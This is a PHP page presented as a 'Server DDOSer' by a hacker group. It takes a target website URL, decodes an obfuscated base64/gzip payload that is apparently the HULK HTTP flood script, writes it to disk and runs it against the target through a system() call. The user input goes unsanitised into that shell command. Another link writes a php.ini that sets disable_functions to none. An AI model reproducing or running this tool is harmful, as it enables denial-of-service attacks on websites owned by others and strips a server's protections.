<?php
$head = '
<html>
<head>
</script>
<title>--==[[Server DDOSer By Team IndiShell]]==--</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<STYLE>
body {
font-family: Tahoma
}
tr {
BORDER: dashed 1px #333;
color: #FFF;
}
td {
BORDER: dashed 1px #333;
color: #FFF;
}
.table1 {
BORDER: 0px Black;
BACKGROUND-COLOR: Black;
color: #FFF;
}
.td1 {
BORDER: 0px;
BORDER-COLOR: #333333;
font: 7pt Verdana;
color: Green;
}
.tr1 {
BORDER: 0px;
BORDER-COLOR: #333333;
color: #FFF;
}
table {
BORDER: dashed 1px #333;
BORDER-COLOR: #333333;
BACKGROUND-COLOR: Black;
color: #FFF;
}
input {
border			: solid 2px;
border-color		: #333;
BACKGROUND-COLOR: white;
font: 10pt comic sans ms;
color: black;
}
select {
BORDER-RIGHT:  Black 2px solid;
BORDER-TOP:    #DF0000 1px solid;
BORDER-LEFT:   #DF0000 1px solid;
BORDER-BOTTOM: Black 1px solid;
BORDER-color: #FFF;
BACKGROUND-COLOR: Black;
font: 8pt Verdana;
color: Red;
}
submit {
BORDER:  buttonhighlight 2px outset;
BACKGROUND-COLOR: Black;
width: 40%;
color: white;
}
textarea {
border			: dashed 2px #333;
BACKGROUND-COLOR: Black;
font: Fixedsys bold;
color: #999;
}
BODY {
	SCROLLBAR-FACE-COLOR: Black; SCROLLBAR-HIGHLIGHT-color: #FFF; SCROLLBAR-SHADOW-color: #FFF; SCROLLBAR-3DLIGHT-color: #FFF; SCROLLBAR-ARROW-COLOR: Black; SCROLLBAR-TRACK-color: #FFF; SCROLLBAR-DARKSHADOW-color: #FFF
margin: 1px;
color: Red;
background-color: Black;
}
.main {
margin			: -287px 0px 0px -490px;
BORDER: dashed 1px #333;
BORDER-COLOR: #333333;
}
.tt {
background-color: Black;
}

A:link {
	COLOR: White; TEXT-DECORATION: none
}
A:visited {
	COLOR: White; TEXT-DECORATION: none
}
A:hover {
	color: Red; TEXT-DECORATION: none
}
A:active {
	color: Red; TEXT-DECORATION: none
}
</STYLE>
<script language=\'javascript\'>
function hide_div(id)
{
  document.getElementById(id).style.display = \'none\';
  document.cookie=id+\'=0;\';
}
function show_div(id)
{
  document.getElementById(id).style.display = \'block\';
  document.cookie=id+\'=1;\';
}
function change_divst(id)
{
  if (document.getElementById(id).style.display == \'none\')
    show_div(id);
  else
    hide_div(id);
}
</script>'; ?>
<html>
	<head>
		<?php 
		echo $head ;
		echo '

<table width="100%" cellspacing="0" cellpadding="0" class="tb1" >

			

       <td width="100%" align=center valign="top" rowspan="1">
            <br><font color=#ff9933 size=6 face="comic sans ms"><b>--==[[ Server</font><font color=white size=6 face="comic sans ms"><b> DDOSer By Team</font><font color=green size=6 face="comic sans ms"><b> Indishell ]]==--</font> 

        <td height="10" align="left" class="td1"></td></tr><tr><td 
        width="100%" align="center" valign="top" rowspan="1"><font 
        color="red" face="comic sans ms"size="1"><b> 
        <font color=#ff9933> 
        ####################################################<font color=white>#####################################################</font><font color=green>####################################################</font><br><font color=white>-==[[Greetz to]]==--</font><br>   Guru ji zero ,code breaker ica, Aasim shaikh, Raman kumar rana,INX_r0ot,Darkwolf indishell, Chinmay Pandya ,Silent poison India,Magnum sniper,Atul Dwivedi,ethicalnoob Indishell,Local root indishell,Irfninja indishell<br>cool toad,cool shavik, Ebin V Thomas,Dinelson Amine ,Mr. Trojan,rad paul,Godzila,mike waals,Neo hacker ICA, Golden boy INDIA,Ketan Singh,Yash,Reborn India,Alicks,Aneesh Dogra,silent hacker,lovetherisk<br>Suriya Prakash,cyber gladiator,Cyber Ace,hero,Minhal Mehdi ,Raj bhai ji,cold fire hacker,Prashant Tanwar, VikAs ViKi ,Rakesh, Bhuppi,Mohit, Ffe ^_^,Ashish,Shardhanand and rest of TEAM INDISHELL<br>

<font color=white>--==[[Dedicated to]]==--</font>
<br># SH.Kishan Singh Tanwar and my Ex Teacher Mrs. Ritu Tomer Rathi #<br><font color=white>--==[[Interface Desgined By]]==--</font><br><font color=red>Deepika Kaushik</font><br><font color=#ff9933> 
        ####################################################<font color=white>#####################################################</font><font color=green>####################################################</font>
						
           </table>
        

'; 
?>

<body bgcolor=black><h4 style="text-align:center" ><font color=white>
<div align=center><table width=50%><tr><td><font color=white><marquee behavior="scroll" direction="left" scrollamount="2" scrolldelay="20" width="100%"><span class="footerlink">Love happen only once .... Rest is life :[</span></marquee><br></font></td></tr></table><br>Special Thanks to Barry Shteiman bhai ji(coder of hulk python script) =))
<p><a href=<?php echo"?in";?>><u><font color=red>php.ini</font></u></a><br>
<?php
error_reporting(0);
if(isset($_GET['in']))
{
	$htcs  = " disable_functions =none ";
$f = fopen('php.ini','w');


fwrite($f , $htcs);


  
echo "<br \><a href=php.ini><font color=white size=4 face='comic sans ms'><u>link  to php.ini</u></a>";

}
?>
<form method=post><font color=red face="comic sans ms">
website that you want Attack:<p><input type=text name=web value=http://website.com><p>
<input type=submit name=sm value="lets game begin 8-))" >

<?php
error_reporting(0);
if(isset($_POST['sm']))
{
	$web=$_POST['web'];
	$sweb = trim($web);
$te1 = ereg_replace("(https?)://", "", $sweb);
	$te = ereg_replace("www.", "", $te1);
	$finalweb="http://".$te;
	

$hulk=gzinflate(base64_decode('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'));

$hulk_file=fopen('hulk.py','w');
fwrite($hulk_file,$hulk);
$hulkf='hulk.py';
$ch="chmod +x ".$hulkf ;
            system($ch);
           
            $z="python ".$hulkf." ".$finalweb;
            system($z);


}



?>
